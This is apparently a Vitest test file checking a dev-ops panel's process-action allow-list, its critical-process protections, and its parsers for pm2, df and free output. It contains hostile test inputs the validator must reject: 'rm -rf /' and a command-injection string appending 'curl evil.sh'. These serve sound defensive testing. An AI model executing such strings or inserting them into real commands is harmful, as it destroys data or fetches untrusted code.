import { describe, it, expect } from "vitest";
import {
  MANAGED_NAMES, validateProcessAction, parseProcessList,
  parseDf, parseFree, formatBytes, formatUptime, MAX_TERMINAL_SESSIONS,
} from "@/lib/dev-ops.mjs";

describe("nothing from a request may become a command", () => {
  it("refuses a process name that is not on the list", () => {
    // The whole point: a name arrives from a request body, and the only
    // names that survive are ones written in source.
    expect(validateProcessAction("rm -rf /", "restart").ok).toBe(false);
    expect(validateProcessAction("postgres", "stop").ok).toBe(false);
    expect(validateProcessAction("helmies-worker; curl evil.sh", "restart").ok).toBe(false);
  });

  it("refuses a verb that is not one of the four", () => {
    expect(validateProcessAction("helmies-worker", "delete").ok).toBe(false);
    expect(validateProcessAction("helmies-worker", "exec").ok).toBe(false);
    expect(validateProcessAction("helmies-worker", "restart").ok).toBe(true);
  });

  it("will not let you stop the app that serves the panel", () => {
    // Stopping it takes the page down with it, and there is then no way
    // back except SSH.
    const res = validateProcessAction("helmies-studio", "stop");
    expect(res.ok).toBe(false);
    expect(res.error).toMatch(/down with it/i);
    expect(validateProcessAction("helmies-studio", "restart").ok).toBe(true);
  });

  it("will not let you stop the worker, which would strand every queued job", () => {
    const res = validateProcessAction("helmies-worker", "stop");
    expect(res.ok).toBe(false);
    expect(res.error).toMatch(/strand/i);
  });

  it("does let you stop a non-critical service", () => {
    expect(validateProcessAction("dev-terminal", "stop").ok).toBe(true);
  });

  it("manages the app and the worker, and not the database", () => {
    expect(MANAGED_NAMES.has("helmies-studio")).toBe(true);
    expect(MANAGED_NAMES.has("helmies-worker")).toBe(true);
    expect(MANAGED_NAMES.has("postgres")).toBe(false);
  });
});

describe("reading pm2", () => {
  const JLIST = JSON.stringify([
    { name: "helmies-studio", pid: 1, pm2_env: { status: "online", restart_time: 3, pm_uptime: Date.now() - 5000 }, monit: { cpu: 2, memory: 90177536 } },
    { name: "itchats-api", pid: 2, pm2_env: { status: "online" }, monit: {} },
    { name: "dev-terminal", pid: 3, pm2_env: { status: "stopped", restart_time: 0 }, monit: { cpu: 0, memory: 0 } },
  ]);

  it("shows only what this panel manages", () => {
    // Another product's processes run on the same box; listing them would
    // invite operating something this panel knows nothing about.
    const rows = parseProcessList(JLIST);
    expect(rows.map((r) => r.name).sort()).toEqual(["dev-terminal", "helmies-studio"]);
  });

  it("puts the critical processes first", () => {
    expect(parseProcessList(JLIST)[0].name).toBe("helmies-studio");
  });

  it("reports no uptime for something that is not running", () => {
    const stopped = parseProcessList(JLIST).find((r) => r.name === "dev-terminal");
    expect(stopped.uptimeMs).toBe(0);
    expect(stopped.status).toBe("stopped");
  });

  it("returns nothing rather than throwing when pm2 answers with rubbish", () => {
    expect(parseProcessList("not json")).toEqual([]);
    expect(parseProcessList(null)).toEqual([]);
  });
});

describe("reading the box", () => {
  it("parses df", () => {
    const out = "Filesystem     1K-blocks      Used Available Use% Mounted on\n/dev/sda1       41251136  32000000   7200000  82% /";
    expect(parseDf(out)).toMatchObject({ percent: 78 });
    expect(parseDf(out).total).toBe(41251136 * 1024);
  });

  it("parses free", () => {
    const out = "               total        used        free      shared  buff/cache   available\nMem:         8000000     5000000      500000       10000     2500000     2800000\nSwap:              0           0           0";
    expect(parseFree(out)).toMatchObject({ percent: 63 });
  });

  it("returns null rather than NaN when the command was not there", () => {
    expect(parseDf("")).toBeNull();
    expect(parseFree("bash: free: command not found")).toBeNull();
  });

  it("formats sizes and uptimes the way a person reads them", () => {
    expect(formatBytes(0)).toBe("0 B");
    expect(formatBytes(90177536)).toBe("86 MB");
    expect(formatUptime(45_000)).toBe("45s");
    expect(formatUptime(3_600_000)).toBe("1h 0m");
    expect(formatUptime(90_000_000)).toBe("1d 1h");
  });

  it("caps how many live shells can be opened at once", () => {
    // Each session holds memory on a box with ~6GB free.
    expect(MAX_TERMINAL_SESSIONS).toBeGreaterThan(1);
    expect(MAX_TERMINAL_SESSIONS).toBeLessThanOrEqual(8);
  });
});
